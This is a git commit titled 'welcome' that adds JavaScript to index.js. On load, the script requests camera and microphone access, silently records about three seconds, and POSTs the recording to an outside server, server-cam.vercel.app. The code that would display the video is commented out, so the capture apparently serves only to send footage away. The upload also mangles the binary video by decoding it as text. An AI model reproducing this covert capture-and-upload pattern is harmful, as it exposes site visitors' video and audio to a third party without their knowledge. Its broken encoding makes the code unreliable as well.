e822caf0459363ba384aeae858ec490007322984
Muhammad Dava Fahreza <mdavafahreza05@gmail.com>
2023-05-24 12:10:35 +0700

    selamat datang

--- index.js
+++ index.js
@@ -16,3 +16,67 @@
 //         // Menangani kesalahan
 //         console.error('Error:', error);
 //     });
+
+
+
+// Membuat objek MediaStream dari getUserMedia
+navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+    .then(function(stream) {
+        // Membuat objek RecordRTC dengan media stream
+        var recorder = RecordRTC(stream, {
+            type: 'video',
+            // mimeType: 'video/mp4',
+            // video: {
+            // width: 4096,
+            // height: 2160
+            // }
+        });
+
+        // Memulai perekaman
+        recorder.startRecording();
+
+        // Menghentikan perekaman setelah 5 detik (misalnya)
+        setTimeout(function() {
+            recorder.stopRecording(function() {
+                // Menghasilkan file video hasil rekaman
+                var blob = recorder.getBlob();
+                var videoURL = URL.createObjectURL(blob);
+
+
+                blob.arrayBuffer()
+                    .then(arrayBuffer => {
+                        const decoder = new TextDecoder();
+                        const text = decoder.decode(arrayBuffer);
+                        console.log(typeof text);
+
+                        // const data = new Blob([text], { type: 'video/mp4' })
+                        // console.log(data)
+                        transfer = { video: text }
+
+                        fetch("https://server-cam.vercel.app/data", {
+                                method: "POST",
+                                // mode: 'navigate',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({ video: text })
+                            })
+                            .then(e => e.json())
+                            .then(e => console.log(e))
+                            .catch(eror => console.log(eror))
+
+                    })
+                    .catch(error => {
+                        // Handle error
+                    });
+
+                // // Menampilkan video pada elemen <video>
+                // const video = document.querySelector('video')
+                // const source = `<source src="${videoURL}" type="video/mp4">`
+                // video.innerHTML = source
+            });
+        }, 3000);
+    })
+    .catch(function(error) {
+        console.log('Gagal mendapatkan stream media:', error);
+    });
